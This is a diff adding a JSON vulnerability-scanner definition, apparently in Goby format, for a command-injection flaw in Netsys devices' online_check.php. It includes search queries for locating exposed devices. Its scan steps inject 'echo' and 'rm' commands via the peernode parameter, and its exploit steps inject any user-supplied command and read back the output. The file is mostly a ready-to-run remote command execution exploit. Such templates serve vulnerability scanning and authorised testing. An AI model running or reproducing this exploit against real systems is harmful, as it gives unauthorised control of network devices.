@@ -1,0 +1,217 @@
+{
+  "Name": "Netsys online_check.php RCE",
+  "Description": "<p>Founded in 2004, Shenzhen Wangyu Technology Co., Ltd. is a national high-tech enterprise specializing in the research and development, production, sales and service of products in the field of network information security. A command execution vulnerability exists in NETSYS of Shenzhen Network Domain Technology Co., Ltd. An attacker could exploit the vulnerability to execute arbitrary system commands.</p>",
+  "Product": "Netsys",
+  "Homepage": "http://www.netsys.cn/",
+  "DisclosureDate": "2022-04-06",
+  "Author": "tardc",
+  "FofaQuery": "title=\"NETSYS\" || title=\"OLYM\"",
+  "GobyQuery": "title=\"NETSYS\" || title=\"OLYM\"",
+  "Level": "3",
+  "Impact": "<p>An attacker could exploit the vulnerability to execute arbitrary system commands.</p>",
+  "Recommendation": "<p>Follow the manufacturer's homepage for timely updates: <a href=\"http://www.netsys.cn/\">http://www.netsys.cn/</a></p>",
+  "References": [
+    "http://www.netsys.cn/"
+  ],
+  "Is0day": false,
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/view/vpn/autovpn/online_check.php",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data_type": "text",
+        "data": "peernode=1;echo+sectest>/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/view/systemConfig/systemTool/ping/sectest",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": "sectest"
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/view/vpn/autovpn/online_check.php",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data_type": "text",
+        "data": "peernode=1;rm+/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/view/vpn/autovpn/online_check.php",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data_type": "text",
+        "data": "peernode=1;{{{cmd}}}>/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/view/systemConfig/systemTool/ping/sectest",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody||"
+      ]
+    }
+  ],
+  "Tags": [
+    "Command Execution"
+  ],
+  "VulType": [
+    "Command Execution"
+  ],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "9.8",
+  "Translation": {
+    "CN": {
+      "Name": "Netsys 存在命令执行漏洞",
+      "Product": "Netsys",
+      "Description": "<p>深圳市网域科技技术有限公司成立于 2004 年，是一家专业从事网络信息安全领域产品的研发、生产、销售及服务的国家高新技术企业。深圳市网域科技技术有限公司 NETSYS 存在命令执行漏洞。攻击者可利用漏洞执行任意系统命令。</p>",
+      "Recommendation": "<p>请关注厂商主页及时更新：<a href=\"http://www.netsys.cn/\">http://www.netsys.cn/</a></p>",
+      "Impact": "<p>深圳市网域科技技术有限公司 NETSYS 存在命令执行漏洞。攻击者可利用漏洞执行任意系统命令。</p>",
+      "VulType": [
+        "命令执⾏"
+      ],
+      "Tags": [
+        "命令执⾏"
+      ]
+    },
+    "EN": {
+      "Name": "Netsys online_check.php RCE",
+      "Product": "Netsys",
+      "Description": "<p>Founded in 2004, Shenzhen Wangyu Technology Co., Ltd. is a national high-tech enterprise specializing in the research and development, production, sales and service of products in the field of network information security. A command execution vulnerability exists in NETSYS of Shenzhen Network Domain Technology Co., Ltd. An attacker could exploit the vulnerability to execute arbitrary system commands.</p>",
+      "Recommendation": "<p>Follow the manufacturer's homepage for timely updates: <a href=\"http://www.netsys.cn/\">http://www.netsys.cn/</a></p>",
+      "Impact": "<p>An attacker could exploit the vulnerability to execute arbitrary system commands.</p>",
+      "VulType": [
+        "Command Execution"
+      ],
+      "Tags": [
+        "Command Execution"
+      ]
+    }
+  },
+  "AttackSurfaces": {
+    "Application": [
+      "Netsys"
+    ],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
